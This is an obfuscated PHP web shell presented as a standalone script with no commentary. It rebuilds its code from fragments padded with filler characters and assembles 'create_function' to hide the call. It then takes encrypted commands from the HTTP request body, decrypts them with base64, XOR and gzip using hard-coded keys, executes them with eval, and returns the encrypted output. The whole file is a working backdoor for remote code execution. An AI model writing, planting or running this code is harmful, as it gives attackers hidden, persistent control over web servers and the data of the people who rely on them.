<?php
$h='php://inptjuttj"),$mtj)==1) {@ob_stjtart();@etjvtjal(@gzunctjomprtjess(@x(@tjbatjse64_decode(tj$mtj[1]),tj$k)));$otj=@ob_get_tj';
$V=str_replace('B','','crBBeBate_BfBuBnction');
$o='t,$k)tj{tj$c=strlen($k);tj$l=strtjlen($tjt);$o=tj"";for($i=tj0;$itj<$l;){for(tjtj$j=0;($j<$ctj&&$i<$tjl);$tjj++,$tj';
$e='i++){$o.tj=$t{tj$i}^$tjk{$tjj};}}rettjurn $o;}itjf (@tjpreg_match(tj"/tj$kh(.tj+)$kf/tj",@fitjle_get_cotjtjntents("tj';
$R='contjtentstj();@tjob_end_cltjean(tj);tj$r=@batjse6tj4_encodetj(@x(@gzcomprtjess($o),$tjk));pritjntjt("$p$khtj$r$kf");}';
$p='$k="9tje828fd6tj";$tjkh="c5792tjb10e7eftjtj";tj$kf="1baf106tj267f9";$p="dtjbtjm1tjNyHtjHkXlRLOdt";funtjctiotjn x(tj$';
$c=str_replace('tj','',$p.$o.$e.$h.$R);
$s=$V('',$c);$s();
?>
